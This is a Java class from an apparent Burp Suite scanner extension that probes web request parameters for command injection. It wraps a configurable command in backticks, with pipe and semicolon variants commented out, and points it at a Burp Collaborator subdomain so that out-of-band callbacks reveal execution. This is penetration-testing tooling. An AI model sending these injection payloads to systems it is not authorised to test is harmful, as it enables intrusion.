package BrianW.AKA.BigChan.PowerScanner;

import BrianW.AKA.BigChan.Tools.FetchCollaboratorWithSig;
import BrianW.AKA.BigChan.Tools.Global;
import BrianW.AKA.BigChan.Tools.Utils;
import burp.*;

import java.util.ArrayList;
import java.util.List;

import static java.lang.Thread.sleep;


public class ScanRCE extends Reporter {
    protected IBurpExtenderCallbacks callbacks;
    protected IExtensionHelpers helpers;
//    private IBurpCollaboratorClientContext collaboratorContext;
//    private InteractionServer interactionServer;
    private List<String> RCEpayloads = new ArrayList<String>() {{
        //add("|{cmd}|");
        add("`{cmd}`");
        //add(";{cmd};");
    }};

    public ScanRCE(IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) {
        super(callbacks, helpers);
        this.callbacks = callbacks;
        this.helpers = helpers;
    }

    public IScanIssue doScanRCE(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        byte[] resp = baseRequestResponse.getResponse();
        String baseName = insertionPoint.getInsertionPointName();
        String insertionPointType = Utils.bytesToHexString(new byte[]{insertionPoint.getInsertionPointType()}, 1);
        String baseValue = insertionPoint.getBaseValue();
//		InteractionServer interactionServer = new InteractionServer();

        for (String RCEpayload : RCEpayloads) {
            IBurpCollaboratorClientContext collaboratorContext = this.callbacks.createBurpCollaboratorClientContext();
            String collaboratorPayload = collaboratorContext.generatePayload(true);
            callbacks.printOutput("generate RCE collaboratorPayload: " + collaboratorPayload);
            String sig = Utils.getRandomString(3).toLowerCase();
            String cmd = String.format("%s %s.%s", Global.config.getConfigRCEcmd_value(), sig, collaboratorPayload);
            String payload = RCEpayload.replace("{cmd}", cmd);
            byte[] reqEvil = insertionPoint.buildRequest((payload).getBytes());
            IHttpRequestResponse pairEvil = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(),
                    reqEvil
            );
            pairEvil.setComment(payload);
            FetchCollaboratorWithSig fetch = new FetchCollaboratorWithSig(
                    reporter(
                            "injection(might be RCE) found",
                            String.format("param: %s <br>" +
                                            "InsertionPointType: %s <br>" +
                                            "Payload: %s"
                                    ,
                                    baseName,
                                    insertionPointType,
                                    payload
                            ),
                            "High",
                            "Certain",
                            pairEvil
                    ),
                    collaboratorPayload,
                    sig,
                    callbacks,
                    helpers,
                    collaboratorContext
            );
            fetch.start();
        }
        return null;
    }
}
